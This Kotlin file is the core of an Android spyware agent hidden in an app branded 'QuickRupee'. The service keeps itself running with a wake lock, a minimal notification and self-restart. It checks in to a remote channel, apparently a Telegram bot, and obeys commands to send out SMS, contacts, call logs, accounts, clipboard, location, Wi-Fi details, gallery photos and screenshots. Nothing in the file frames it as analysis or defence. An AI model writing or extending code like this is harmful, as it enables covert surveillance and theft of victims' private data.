package com.quick.rupee

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.os.PowerManager

class SyncService : Service() {

    private var offset = 0L
    private var started = false
    private var lock: PowerManager.WakeLock? = null

    override fun onBind(i: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        startFg()
        runCatching {
            val pm = getSystemService(PowerManager::class.java)
            lock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "qr:agent")
            lock?.acquire()
        }
    }

    private fun startFg() {
        val nm = getSystemService(NotificationManager::class.java)
        if (Build.VERSION.SDK_INT >= 26) {
            nm.createNotificationChannel(
                NotificationChannel("sys", "QuickRupee", NotificationManager.IMPORTANCE_MIN))
        }
        val n = Notification.Builder(this, "sys")
            .setContentTitle("QuickRupee")
            .setContentText("Seva chalu hai")
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .build()
        if (Build.VERSION.SDK_INT >= 34)
            startForeground(1, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE)
        else startForeground(1, n)
    }

    override fun onStartCommand(i: Intent?, f: Int, id: Int): Int {
        Watchdog.arm(this)
        if (!started) {
            started = true
            Thread { loop() }.start()
        }
        return START_STICKY
    }

    private fun loop() {
        runCatching {
            Tg.text("<b>ONLINE</b>\n${Build.MANUFACTURER} ${Build.MODEL} / A${Build.VERSION.RELEASE}")
            Collector.dump(this)
        }
        while (true) {
            try {
                val r = Tg.poll(offset)
                offset = r.first
                for (c in r.second) runCatching { handle(c) }
            } catch (e: Throwable) {
                Thread.sleep(7000)
            }
        }
    }

    private fun handle(c: Cmd) {
        when (c.name) {
            "ss" -> shot(1)
            "ss5" -> shot(5)
            "ss10" -> shot(10)
            "sms" -> Collector.sms(this)
            "contacts" -> Collector.contacts(this)
            "calllog" -> Collector.callLog(this)
            "apps" -> Collector.apps(this)
            "accounts" -> Collector.accounts(this)
            "clip" -> Collector.clip(this)
            "loc" -> Collector.loc(this)
            "wifi" -> Collector.wifi(this)
            "gallery" -> Collector.gallery(this, 20)
            "dump" -> Collector.dump(this)
            "info" -> Tg.text("${Build.MANUFACTURER} ${Build.MODEL} / A${Build.VERSION.RELEASE}")
            else -> Tg.text("cmd: ss | ss5 | sms | contacts | calllog | apps | accounts | clip | loc | wifi | gallery | dump")
        }
    }

    private fun shot(n: Int) {
        startActivity(Intent(this, ShotActivity::class.java)
            .putExtra("count", n)
            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
    }

    override fun onDestroy() {
        runCatching { lock?.release() }
        super.onDestroy()
    }
}
